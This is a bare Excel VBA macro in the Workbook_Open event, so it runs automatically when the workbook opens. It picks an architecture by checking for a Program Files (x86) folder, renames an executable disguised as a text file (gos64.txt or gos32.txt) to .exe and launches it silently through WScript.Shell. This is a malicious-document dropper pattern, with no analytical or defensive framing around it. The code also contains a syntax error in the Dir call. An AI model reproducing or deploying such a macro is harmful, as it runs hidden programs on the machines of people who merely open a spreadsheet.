Private Sub Workbook_Open()
Dim sFileName64 As String, sNewFileName64 As String
Dim sFileName32 As String, sNewFileName32 As String 

If Dir("C:/Program\ Files\ (x86)" & "/" client, vbDirectory) = "" Then
  
    sFileName64 = ThisWorkbook.Path & "\gos64.txt"    'name of current file
    sNewFileName64 = ThisWorkbook.Path & "\gos64.exe"     'filename to rename
    'If Dir(sFileName, 16) = "" Then MsgBox "Нет такого файла", vbCritical, "error": Exit Sub
 
    Name sFileName64 As sNewFileName64 'rename file
    
    'MsgBox "file has been renamed"
 
    'start test.exe 
    Set WshScript = CreateObject("WScript.Shell")
    D = WshScript.Run(sNewFileName64, 4, False)
Else 
    sFileName32 = ThisWorkbook.Path & "\gos32.txt"    'name of current file
    sNewFileName32 = ThisWorkbook.Path & "\gos32.exe"     'filename to rename
    'If Dir(sFileName, 16) = "" Then MsgBox "Нет такого файла", vbCritical, "error": Exit Sub
 
    Name sFileName32 As sNewFileName32 'rename file
    
    'MsgBox "file has been renamed"
 
    'start test.exe 
    Set WshScript = CreateObject("WScript.Shell")
    C = WshScript.Run(sNewFileName32, 4, False)   
End If
End Sub
